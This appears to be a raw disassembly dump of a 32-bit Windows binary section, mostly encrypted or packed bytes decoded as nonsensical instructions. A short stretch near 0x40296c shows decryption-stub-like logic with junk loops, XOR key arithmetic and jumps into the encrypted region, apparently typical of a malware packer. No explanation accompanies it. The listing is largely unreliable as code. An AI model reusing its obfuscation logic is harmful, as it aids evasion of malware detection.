  40288c:	mov    eax,ds:0xaee52ae4
  402891:	jl     0x4028d8
  402893:	ins    DWORD PTR es:[edi],dx
  402894:	ret    0xb300
  402897:	jp     0x4028a0
  402899:	aaa    
  40289a:	push   edi
  40289b:	or     BYTE PTR [ebx+eiz*4],ah
  40289e:	retf   
  40289f:	dec    esi
  4028a0:	sbb    esp,DWORD PTR [esi-0x15]
  4028a3:	push   edx
  4028a4:	cmp    dh,BYTE PTR [edx]
  4028a6:	push   ecx
  4028a7:	cdq    
  4028a8:	mov    ?,ecx
  4028aa:	jge    0x4028bf
  4028ac:	repnz repnz push ebp
  4028af:	pop    eax
  4028b0:	inc    ebx
  4028b1:	imul   esi,DWORD PTR [esi],0xeb1daaa3
  4028b7:	fdivrp st(3),st
  4028b9:	jmp    0x402849
  4028bb:	enter  0xb9ac,0x95
  4028bf:	sbb    BYTE PTR [eax],cl
  4028c1:	in     al,0xbd
  4028c3:	sub    DWORD PTR [edx],0x29
  4028c6:	add    al,0x72
  4028c8:	jmp    0xa3f7:0x847d2b6c
  4028cf:	jge    0x402876
  4028d1:	mov    edi,0x8944feb2
  4028d6:	arpl   WORD PTR [edi-0x22],bx
  4028d9:	gs pop edx
  4028db:	push   edi
  4028dc:	sub    DWORD PTR [edx],0xd8a9476
  4028e2:	sti    
  4028e3:	jg     0x402919
  4028e5:	call   0xaf7d:0xdb932296
  4028ec:	xchg   ebp,eax
  4028ed:	adc    DWORD PTR [ebx-0x14],edx
  4028f0:	xchg   DWORD PTR [esi],esi
  4028f2:	mov    edi,0xa928f436
  4028f7:	sub    bl,BYTE PTR [eax]
  4028f9:	stc    
  4028fa:	sbb    eax,0x4f713458
  4028ff:	xchg   DWORD PTR [ebp+edx*4+0x41],esi
  402903:	fisub  WORD PTR [ecx]
  402905:	test   al,0x55
  402907:	daa    
  402908:	js     0x402985
  40290a:	sbb    dh,dl
  40290c:	ficomp DWORD PTR [esi+0x56]
  40290f:	fnstenv [esi+ebx*2+0x5740ab55]
  402916:	mov    ah,0x73
  402918:	les    edi,FWORD PTR [ecx]
  40291a:	jmp    0x41cc1654
  40291f:	push   ebp
  402920:	pop    es
  402921:	sub    DWORD PTR [edx-0x66],esi
  402924:	in     eax,0xd
  402926:	jno    0x4028bb
  402928:	test   eax,0x5e9a3339
  40292d:	inc    ebp
  40292e:	int3   
  40292f:	shl    ch,1
  402931:	out    0x32,eax
  402933:	ja     0x402968
  402935:	lahf   
  402936:	and    DWORD PTR [edi+0x2d],esp
  402939:	test   BYTE PTR [ebx+0x68],dl
  40293c:	dec    eax
  40293d:	mov    ah,0x3d
  40293f:	pop    bp
  402941:	mov    esi,0x707d10a8
  402946:	xchg   ebp,eax
  402947:	(bad)  
  402949:	jecxz  0x402973
  40294b:	adc    bl,BYTE PTR [ebp-0x29c70bdc]
  402951:	sub    eax,0xc28c3cb0
  402956:	cmp    al,0x53
  402958:	test   DWORD PTR [eax-0x76],0x4630565d
  40295f:	ja     0x402943
  402961:	inc    edi
  402962:	sbb    BYTE PTR [ebx+0x7d],0xf5
  402966:	rcr    BYTE PTR [esi-0x37],cl
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fcdd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e6ef
  402988:	sbb    DWORD PTR ds:0x42e713,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fce9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fce9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fce9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e12c
  4029bc:	push   0x42e703
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e44f
  4029cc:	mov    edx,DWORD PTR ds:0x42fce9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fce9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e6ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e6ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e6ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e2d3
  402a0d:	cmp    DWORD PTR ds:0x42e6ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e6ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e6ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e6ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e6ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fdae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fcd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e128,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e128,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e128
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e128,edi
  402a94:	cmp    DWORD PTR ds:0x42e128,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e128,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e141
  402ab3:	call   DWORD PTR ds:0x42e453
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0x63107e2b
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0xb470707e
  402afd:	push   eax
  402afe:	mov    ds:0xdc0a05af,al
  402b03:	lods   eax,DWORD PTR ds:[esi]
  402b04:	mov    ebx,0x20f2859f
  402b09:	mov    ebx,0xb9a6317d
  402b0e:	add    eax,0xddaf5194
  402b13:	fsubr  DWORD PTR [edi+ebx*8+0x59]
  402b17:	fucom  st(2)
  402b19:	or     esi,edi
  402b1b:	xchg   edx,eax
  402b1c:	packuswb mm3,mm3
  402b1f:	jecxz  0x402b4d
  402b21:	pop    esp
  402b22:	cli    
  402b23:	sub    ah,al
  402b25:	repnz retf 
  402b27:	outs   dx,DWORD PTR ds:[si]
  402b29:	mov    edx,0x713bb4f0
  402b2e:	rcl    dh,1
  402b30:	in     eax,0x9a
  402b32:	shl    DWORD PTR [edx],0xfc
  402b35:	xchg   ebp,eax
  402b36:	out    dx,eax
  402b37:	mov    ds:0x22c650f3,eax
  402b3c:	mov    DWORD PTR [ebx],esp
  402b3e:	inc    edi
  402b3f:	retf   0x73b5
  402b42:	or     ecx,DWORD PTR [ebx]
  402b44:	in     eax,dx
  402b45:	mov    ebx,0x98e61d53
  402b4a:	test   eax,0x1eec3d76
  402b4f:	or     DWORD PTR [ebx],ebp
  402b51:	push   cs
  402b52:	or     DWORD PTR [esi-0x43],0x2311de47
  402b59:	imul   esi,DWORD PTR [edi+0x1f],0x830d6af2
  402b60:	pop    edx
  402b61:	test   BYTE PTR [ecx],ch
  402b63:	cs enter 0xff6c,0x97
  402b68:	cmp    BYTE PTR [ecx],0xdf
  402b6b:	cmp    bl,0x4f
  402b6e:	push   ss
  402b6f:	xchg   ecx,eax
  402b70:	xor    DWORD PTR [ecx-0x818dfd6],edx
  402b76:	jge    0x402bd7
  402b78:	cmp    DWORD PTR [edx-0x78],0x2f5dc03f
  402b7f:	dec    edx
  402b80:	pop    edx
  402b81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b82:	icebp  
  402b83:	fneni(8087 only) 
  402b85:	iret   
  402b86:	call   DWORD PTR [ecx+0x502901f4]
  402b8c:	arpl   cx,di
  402b8e:	sahf   
  402b8f:	sbb    DWORD PTR [ecx+0xb8d2361],edi
  402b95:	or     esi,esi
  402b97:	bound  eax,QWORD PTR [esi]
  402b99:	or     DWORD PTR [esi],ebp
  402b9b:	jae    0x402bcb
  402b9d:	aaa    
  402b9e:	jp     0x402b31
  402ba0:	adc    edi,0xffffff8f
  402ba3:	call   0xb175:0x52067f32
  402baa:	rcl    DWORD PTR [eax-0x36],1
  402bad:	aam    0x17
  402baf:	test   eax,0x78005bd0
  402bb4:	dec    edi
  402bb5:	fisubr WORD PTR [edi-0x5a3ee904]
  402bbb:	xchg   ebp,eax
  402bbc:	pop    ebx
  402bbd:	out    dx,eax
  402bbe:	in     eax,0x37
  402bc0:	xlat   BYTE PTR ds:[ebx]
  402bc1:	fcomp  QWORD PTR [edx]
  402bc3:	popa   
  402bc4:	aad    0xbc
  402bc6:	mov    esi,edx
  402bc8:	jbe    0x402b4a
  402bca:	hlt    
  402bcb:	shl    DWORD PTR [ebx+0x6a],0xe5
  402bcf:	imul   edx,DWORD PTR [eax+ecx*2],0x3e
  402bd3:	shl    DWORD PTR cs:[ebx],cl
  402bd6:	xchg   esi,eax
  402bd7:	cs cdq 
  402bd9:	lahf   
  402bda:	adc    al,0x94
  402bdc:	inc    edx
  402bdd:	enter  0xb6e8,0x7f
  402be1:	retf   0xddf8
  402be4:	mov    dh,0x14
  402be6:	out    0x67,al
  402be8:	shl    DWORD PTR [si+0x34],cl
  402bec:	push   ss
  402bed:	iret   
  402bee:	inc    ebp
  402bef:	push   cs
  402bf0:	jns    0x402b97
  402bf2:	inc    esp
  402bf3:	jp     0x402b9e
  402bf5:	bound  eax,QWORD PTR [ebx-0x4fe3e10b]
  402bfb:	ss jb  0x402b8a
  402bfe:	push   edx
  402bff:	add    al,0x1b
  402c01:	fdiv   QWORD PTR [edx]
  402c03:	stos   BYTE PTR es:[edi],al
  402c04:	pop    ebp
  402c05:	mov    eax,0x450dddc9
  402c0a:	xchg   esi,eax
  402c0b:	scas   al,BYTE PTR es:[edi]
  402c0c:	sub    dl,bh
  402c0e:	mov    cl,0x14
  402c10:	xchg   edx,edi
  402c12:	push   esp
  402c13:	adc    BYTE PTR [esi-0x6d],ah
  402c16:	gs int 0xdc
  402c19:	mov    bh,0x7b
  402c1b:	pop    ecx
  402c1c:	mov    dh,0x93
  402c1e:	test   al,0x5b
  402c20:	(bad)  
  402c21:	enter  0x8266,0xeb
  402c25:	xchg   BYTE PTR [eax+eiz*4],bh
  402c28:	out    0x74,eax
  402c2a:	add    al,0x30
  402c2c:	pop    ebp
  402c2d:	adc    BYTE PTR [edx],bh
  402c2f:	push   ecx
  402c30:	push   eax
  402c31:	inc    edx
  402c32:	ficomp WORD PTR [edx+0xc8e4b9f]
  402c38:	jae    0x402c7e
  402c3a:	imul   esi,DWORD PTR [ecx+0x194351aa],0x14
  402c41:	and    bl,BYTE PTR [eax-0x7f938de5]
  402c47:	sar    DWORD PTR [eax+edx*4+0xac6a0e9],1
  402c4e:	(bad)  
  402c4f:	jmp    0x22a9:0xb8d0bae
  402c56:	scas   al,BYTE PTR es:[edi]
  402c57:	push   ebx
  402c58:	mov    ch,0x6a
  402c5a:	push   esp
  402c5b:	ret    
  402c5c:	loope  0x402c00
  402c5e:	lds    ebp,FWORD PTR [eax]
  402c60:	(bad)  
  402c61:	dec    esi
  402c62:	and    cl,dh
  402c64:	cwde   
  402c65:	sbb    eax,DWORD PTR [esp+edi*2-0x25]
  402c69:	sahf   
  402c6a:	ficom  DWORD PTR [ebp+0x59]
  402c6d:	(bad)  
  402c6e:	cmp    DWORD PTR [ebx+0x6b],ebp
  402c71:	js     0x402ca9
  402c73:	fisub  DWORD PTR [ecx+0x18]
  402c76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c77:	(bad)  
  402c79:	enter  0x1781,0x6
  402c7d:	jp     0x402c0a
  402c7f:	push   ebx
  402c80:	add    al,0xd7
  402c82:	int3   
  402c83:	sub    eax,0x83dd8de3
  402c88:	adc    ebp,esp
  402c8a:	dec    eax
  402c8b:	add    BYTE PTR [esi],ch
  402c8d:	xchg   edx,eax
  402c8e:	mov    bh,0xc9
  402c90:	sub    eax,0x56a2649c
  402c95:	test   DWORD PTR ds:0x1e7e646e,edx
  402c9b:	xchg   edi,eax
  402c9c:	sub    eax,0xc14bd96a
  402ca2:	out    0x45,al
  402ca4:	sbb    BYTE PTR ds:0x56c2,al
  402ca9:	sub    cl,0x27
  402cac:	cld    
  402cad:	int3   
  402cae:	jns    0x402d06
  402cb0:	adc    BYTE PTR [esi],ch
  402cb2:	sub    eax,0x1aa2b3bd
  402cb7:	inc    esp
  402cb8:	push   0xeebf3139
  402cbd:	push   cs
  402cbe:	push   0xe63a57dc
  402cc3:	xor    al,0x89
  402cc5:	aad    0x4f
  402cc7:	int    0x97
  402cc9:	cmp    al,0xfa
  402ccb:	inc    ebx
  402ccc:	sbb    eax,0xb07c3189
  402cd1:	int    0xf9
  402cd3:	push   eax
  402cd4:	mov    BYTE PTR [eax-0x2ac8a2e7],dh
  402cda:	mov    ds:0xddd42709,al
  402cdf:	jo     0x402c81
  402ce1:	inc    edx
  402ce2:	sahf   
  402ce3:	mov    ebp,0x6937adc5
  402ce8:	in     eax,0x3f
  402cea:	std    
  402ceb:	inc    eax
  402cec:	jle    0x402cf8
  402cee:	and    cl,BYTE PTR [edi+0x29e47678]
  402cf4:	mov    ds:0x7fa5b236,al
  402cf9:	stos   DWORD PTR es:[edi],eax
  402cfa:	xchg   esi,eax
  402cfb:	push   edi
  402cfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cfe:	pop    ecx
  402cff:	mov    ah,0x3e
  402d01:	pop    esi
  402d02:	fdivrp st(6),st
  402d04:	cld    
  402d05:	xor    ah,dh
  402d07:	cmp    BYTE PTR [edx+0x19],cl
  402d0a:	test   DWORD PTR [eax],esi
  402d0c:	test   BYTE PTR [ebx+0x3435a0fe],cl
  402d12:	adc    bl,dl
  402d14:	xor    eax,0x282e0323
  402d19:	out    dx,eax
  402d1a:	retf   
  402d1b:	mov    bh,0xc9
  402d1d:	js     0x402d7a
  402d1f:	mov    fs,WORD PTR [ebp+ecx*4+0x7a]
  402d23:	sbb    edi,ebp
  402d25:	ret    
  402d26:	pop    ss
  402d27:	ins    BYTE PTR es:[edi],dx
  402d28:	mul    DWORD PTR ds:0x104ebd7b
  402d2e:	sbb    bl,BYTE PTR [eax+0x13]
  402d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d32:	arpl   WORD PTR [edi],ax
  402d34:	icebp  
  402d35:	fst    QWORD PTR [eax-0xd40facf]
  402d3b:	or     DWORD PTR [ecx+0x36747a41],0x1f98bdcc
  402d45:	outs   dx,DWORD PTR ds:[esi]
  402d46:	addr16 adc eax,0x51209112
  402d4c:	mov    edx,0x5bad10d3
  402d51:	mov    eax,0x85a637af
  402d56:	jbe    0x402dd1
  402d58:	test   al,0xd5
  402d5a:	and    esp,0xffffff97
  402d5d:	jle    0x402d53
  402d5f:	and    BYTE PTR [edi-0x1d],dl
  402d62:	or     BYTE PTR [edi+ecx*1+0x69],cl
  402d66:	pop    esp
  402d67:	mov    eax,0xce30f33b
  402d6c:	jg     0x402d3b
  402d6e:	cmc    
  402d6f:	jae    0x402d37
  402d71:	or     eax,0x73a18b1d
  402d76:	or     eax,0x85e9fdca
  402d7b:	(bad)  
  402d7c:	pop    edi
  402d7d:	mov    edi,0xd06d1714
  402d82:	cli    
  402d83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d84:	scas   eax,DWORD PTR es:[edi]
  402d85:	mov    al,0xcb
  402d87:	frstor [esi+0x26]
  402d8a:	mov    bh,0x46
  402d8c:	mov    edi,0xb382bfc9
  402d91:	enter  0x5f5d,0x7d
  402d95:	jb     0x402df9
  402d97:	mov    esi,0xb9984519
  402d9c:	and    ch,0xd3
  402d9f:	es out dx,al
  402da1:	outs   dx,DWORD PTR ds:[esi]
  402da2:	and    eax,0xd1342565
  402da7:	inc    ecx
  402da8:	jne    0x402df2
  402daa:	adc    BYTE PTR [edx+0x15],bh
  402dad:	pop    ds
  402dae:	test   eax,0xe9b94720
  402db3:	int    0xb6
  402db5:	jmp    0x1b1506bf
  402dba:	int    0xaa
  402dbc:	pop    edx
  402dbd:	xor    eax,0xd73bd603
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	(bad)  
  402de0:	jnp    0x402d69
  402de2:	sub    edi,DWORD PTR [esi-0x418f8ff6]
  402de8:	jle    0x402e5a
  402dea:	jo     0x402d8a
  402dec:	mov    bl,0x3e
  402dee:	pushf  
  402def:	push   ds
  402df0:	ja     0x402de9
  402df2:	sub    BYTE PTR cs:[esi+0x6e],al
  402df6:	jecxz  0x402dbe
  402df8:	(bad)  
  402dfa:	mov    bl,0x21
  402dfc:	mov    BYTE PTR [ecx],0x9b
  402dff:	inc    ebx
  402e00:	in     eax,dx
  402e01:	and    ah,BYTE PTR [esi-0x26]
  402e04:	push   edx
  402e05:	xor    al,0x41
  402e07:	jne    0x402e47
  402e09:	js     0x402e54
  402e0b:	and    dh,ch
  402e0d:	push   edi
  402e0e:	gs cli 
  402e10:	cwde   
  402e11:	mov    esi,0x9cd4d280
  402e16:	adc    ebx,DWORD PTR [ebp+0x6b]
  402e19:	out    dx,al
  402e1a:	adc    BYTE PTR [edx],dl
  402e1c:	bound  esi,QWORD PTR [esi+0x52]
  402e1f:	mov    edx,0x664829ed
  402e24:	cmp    bl,BYTE PTR [esi]
  402e26:	imul   DWORD PTR [esi]
  402e28:	cld    
  402e29:	and    eax,0x5030c9de
  402e2e:	mov    cs,edx
  402e30:	cwde   
  402e31:	stos   BYTE PTR es:[edi],al
  402e32:	iret   
  402e33:	cld    
  402e34:	jae    0x402e7d
  402e36:	xor    DWORD PTR [eax-0x30],ecx
  402e39:	(bad)  [eax]
  402e3b:	psubb  mm3,QWORD PTR [ebx-0x3a4c0a77]
  402e42:	jmp    0x402e95
  402e44:	rcr    BYTE PTR [ecx-0x4533cf21],1
  402e4a:	sub    BYTE PTR ds:0xad484b9e,bl
  402e50:	push   ebp
  402e51:	mov    ebx,0x63c92ace
  402e56:	mov    edi,0xa6dcc968
  402e5b:	mov    ds:0x944943f3,eax
  402e60:	in     eax,dx
  402e61:	sbb    eax,0xe2fed3a8
  402e66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e67:	gs dec ebx
  402e69:	and    DWORD PTR [ebp+ecx*4-0x5ccbb3c],edx
  402e70:	sub    ch,al
  402e72:	mov    cl,0x60
  402e74:	rcr    DWORD PTR [ebx-0x36],cl
  402e77:	mov    dh,bh
  402e79:	mov    bh,0xfd
  402e7b:	test   BYTE PTR [eax+ecx*2+0x640463d1],bl
  402e82:	popf   
  402e83:	retf   
  402e84:	adc    ebx,DWORD PTR [ebp+0x259c9282]
  402e8a:	bound  ecx,QWORD PTR [edi]
  402e8c:	xor    BYTE PTR [ebp+0x5ac80b08],ah
  402e92:	push   es
  402e93:	ficomp DWORD PTR [esp+edx*4]
  402e96:	ins    DWORD PTR es:[edi],dx
  402e97:	push   edx
  402e98:	es call 0x46e78749
  402e9e:	inc    esp
  402e9f:	dec    esi
  402ea0:	les    ecx,FWORD PTR [ecx-0x691ce383]
  402ea6:	xor    dh,BYTE PTR [ebp+0x4aa48593]
  402eac:	scas   eax,DWORD PTR es:[edi]
  402ead:	jle    0x402e48
  402eaf:	inc    edx
  402eb0:	dec    esp
  402eb1:	push   ecx
  402eb2:	xor    eax,0x542db892
  402eb7:	fld    DWORD PTR [edx+0x19]
  402eba:	mov    dh,0x1b
  402ebc:	mov    ecx,0xf04df98c
  402ec1:	dec    esp
  402ec2:	idiv   DWORD PTR [ecx]
  402ec4:	jmp    0x6bfe33a2
  402ec9:	cwde   
  402eca:	scas   al,BYTE PTR es:[edi]
  402ecb:	imul   ecx,DWORD PTR [edx+eiz*2+0x75106f97],0x2e
  402ed3:	pop    ss
  402ed4:	sbb    BYTE PTR [esp+ebp*8],ah
  402ed7:	cmp    eax,0x2435953f
  402edc:	dec    edi
  402edd:	pop    es
  402ede:	jne    0x402ee5
  402ee0:	mov    esp,0x542af5a7
  402ee5:	mov    eax,ds:0x43bf6ea5
  402eea:	cld    
  402eeb:	ss xchg edi,eax
  402eed:	shl    BYTE PTR [ecx-0x25],1
  402ef0:	lods   eax,DWORD PTR ds:[esi]
  402ef1:	inc    ebp
  402ef2:	jmp    0x402ed8
  402ef4:	jo     0x402eb9
  402ef6:	or     al,0x19
  402ef8:	mov    DWORD PTR [eax+0x1a],esi
  402efb:	and    ch,BYTE PTR [ebp+esi*8+0x15]
  402eff:	int3   
  402f00:	pop    esi
  402f01:	imul   edx,edx,0x34
  402f04:	sub    al,0x3a
  402f06:	pop    ds
  402f07:	repnz inc esi
  402f09:	ja     0x402ea5
  402f0b:	inc    esp
  402f0c:	int    0x2
  402f0e:	call   0x1feb:0x5e5d98eb
  402f15:	fs cs out 0xfe,al
  402f19:	addr16 and eax,edi
  402f1c:	inc    esp
  402f1d:	loopne 0x402f9d
  402f1f:	mov    ecx,0x44764ee3
  402f24:	push   cs
  402f25:	cmp    al,0x7f
  402f27:	xchg   esp,eax
  402f28:	retf   0xa2b5
  402f2b:	out    0xc,eax
  402f2d:	mov    cl,BYTE PTR [ebp+0x4d]
  402f30:	fsub   QWORD PTR [ebx]
  402f32:	dec    edi
  402f33:	data16 adc bl,ah
  402f36:	outs   dx,BYTE PTR ds:[esi]
  402f37:	lods   al,BYTE PTR ds:[esi]
  402f38:	mov    bl,BYTE PTR [esi+0x3b]
  402f3b:	pop    ss
  402f3c:	fcomp  QWORD PTR [edi+0x45119140]
  402f42:	pop    ss
  402f43:	push   ebx
  402f44:	stc    
  402f45:	out    dx,al
  402f46:	cs dec esi
  402f48:	rcr    ecx,1
  402f4a:	ins    DWORD PTR es:[edi],dx
  402f4b:	sub    BYTE PTR [edi+0x31],0xb5
  402f4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f50:	fisttp QWORD PTR [edx-0x70bfccf2]
  402f56:	and    eax,0xe5255e62
  402f5b:	inc    edi
  402f5c:	mov    ch,0xea
  402f5e:	adc    eax,0x197e4e63
  402f63:	pop    es
  402f64:	sbb    bl,BYTE PTR [esi]
  402f66:	ror    ebp,1
  402f68:	std    
  402f69:	push   eax
  402f6a:	sbb    DWORD PTR [eax-0x74c9856e],ebp
  402f70:	sbb    edx,ebp
  402f72:	jecxz  0x402fdd
  402f74:	test   eax,0x3392d98d
  402f79:	clc    
  402f7a:	jg     0x402fdb
  402f7c:	push   esi
  402f7d:	(bad)  
  402f7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f7f:	xor    edx,DWORD PTR [edi+0x401ed8e3]
  402f85:	inc    ebp
  402f86:	mov    esi,0x6db940d8
  402f8b:	or     dh,BYTE PTR [ebx+0xa]
  402f8e:	ss js  0x402f14
  402f91:	dec    ecx
  402f92:	xchg   DWORD PTR [esi+0x64],eax
  402f95:	pop    edi
  402f96:	mov    dl,0x85
  402f98:	jns    0x402fb3
  402f9a:	or     eax,0x51dd21a5
  402f9f:	pop    edi
  402fa0:	pop    ebx
  402fa1:	sar    DWORD PTR [edi+0x4c],1
  402fa4:	mov    eax,0x7988ad5
  402fa9:	iret   
  402faa:	xchg   bh,bl
  402fac:	push   ss
  402fad:	jno    0x402f30
  402faf:	hlt    
  402fb0:	test   ah,bh
  402fb2:	push   esp
  402fb3:	dec    edi
  402fb4:	cs fucom st(1)
  402fb7:	add    eax,0x86bc5fca
  402fbc:	std    
  402fbd:	mov    bh,0xe5
  402fbf:	xchg   edx,eax
  402fc0:	(bad)  
  402fc1:	stos   BYTE PTR es:[edi],al
  402fc2:	mov    ah,0x3b
  402fc4:	push   0xfffffff6
  402fc6:	pop    edx
  402fc7:	xor    dh,BYTE PTR [eax-0x7]
  402fca:	fs test eax,0x2c3228ff
  402fd0:	aas    
  402fd1:	adc    DWORD PTR [esi],ecx
  402fd3:	ror    BYTE PTR [esi+0x74],1
  402fd6:	push   0xffffffaf
  402fd8:	dec    esi
  402fd9:	hlt    
  402fda:	xor    ebx,DWORD PTR [eax+0x3d1bbb88]
  402fe0:	sub    edi,DWORD PTR [eax]
  402fe2:	pop    ss
  402fe3:	dec    eax
  402fe4:	(bad)  
  402fe5:	or     DWORD PTR [ebp-0x6e],edx
  402fe8:	jecxz  0x403041
  402fea:	pop    es
  402feb:	xchg   esp,eax
  402fec:	mov    al,0xa
  402fee:	bound  edi,QWORD PTR [edx+0x2f2154b1]
  402ff4:	inc    ecx
  402ff5:	popf   
  402ff6:	push   ecx
  402ff7:	jmp    0xd805:0x52e947a
  402ffe:	add    ebp,DWORD PTR [edi+0x3c0208ea]
  403004:	icebp  
  403005:	cmp    eax,0x651112d6
  40300a:	cmp    edi,ecx
  40300c:	mov    dl,0xeb
  40300e:	push   ss
  40300f:	mov    ecx,0xf49dfb3a
  403014:	nop
  403015:	push   edi
  403016:	add    esi,ebx
  403018:	add    BYTE PTR [edi-0x8],bh
  40301b:	add    ecx,DWORD PTR [eax+0x11]
  40301e:	mov    dl,0xc3
  403020:	dec    esi
  403021:	mov    esi,DWORD PTR [ecx-0x1c0a9e2d]
  403027:	retf   0x15e5
  40302a:	mov    ebx,DWORD PTR [ebx-0x1de07074]
  403030:	jb     0x402fe4
  403032:	jne    0x40307c
  403034:	mov    eax,ds:0x7fb05ab2
  403039:	(bad)  
  40303a:	sub    al,0xa5
  40303c:	dec    DWORD PTR [ebx-0x55]
  40303f:	pop    ds
  403040:	stos   DWORD PTR es:[edi],eax
  403041:	cdq    
  403042:	and    dl,BYTE PTR ds:0xfdb9ee92
  403048:	and    eax,ecx
  40304a:	scas   eax,DWORD PTR es:[edi]
  40304b:	fucomi st,st(7)
  40304d:	fld    TBYTE PTR [edi]
  40304f:	ficomp WORD PTR [edx]
  403051:	std    
  403052:	add    esp,DWORD PTR ds:0xaf40fba0
  403058:	es fs pop edx
  40305b:	xlat   BYTE PTR ds:[ebx]
  40305c:	xchg   ecx,eax
  40305d:	and    BYTE PTR [ebp+0x13d70c42],dl
  403063:	add    BYTE PTR [eax+0x73740996],dh
  403069:	out    dx,eax
  40306a:	sbb    eax,DWORD PTR [eax-0x6cd94238]
  403070:	sti    
  403071:	repz iret 
  403073:	dec    esp
  403074:	gs ret 
  403076:	test   al,0xf6
  403078:	aam    0xcf
  40307a:	mov    al,ds:0x54cecab
  40307f:	in     al,dx
  403080:	add    al,0x46
  403082:	retf   
  403083:	lock pop edi
  403085:	retf   0x6431
  403088:	outs   dx,BYTE PTR ds:[esi]
  403089:	or     DWORD PTR [ebp+0x54ca5771],edx
  40308f:	mov    esp,0x80d86de2
  403094:	stos   BYTE PTR es:[edi],al
  403095:	jge    0x4030e7
  403097:	jb     0x403072
  403099:	call   0x26f6c0ab
  40309e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40309f:	movhps xmm6,QWORD PTR [edi+0x7e]
  4030a3:	mov    eax,ds:0xfcfe3c09
  4030a8:	and    esi,edi
  4030aa:	pop    eax
  4030ab:	xchg   esi,eax
  4030ac:	fidivr WORD PTR [esi+0x32729c]
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0x7
  4030ce:	rol    BYTE PTR [ebx+0x4c],1
  4030d1:	cld    
  4030d2:	pop    ss
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0x4c70707e
  4030da:	or     dl,BYTE PTR [bx+si]
  4030dd:	mov    eax,DWORD PTR [esi+0x775d43ff]
  4030e3:	les    ebp,FWORD PTR [ecx]
  4030e5:	xchg   cl,al
  4030e7:	repnz aam 0xf6
  4030ea:	(bad)  
  4030eb:	(bad)  
  4030ec:	jbe    0x403126
  4030ee:	push   edx
  4030ef:	data16 in al,dx
  4030f1:	xor    bh,BYTE PTR [ecx]
  4030f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
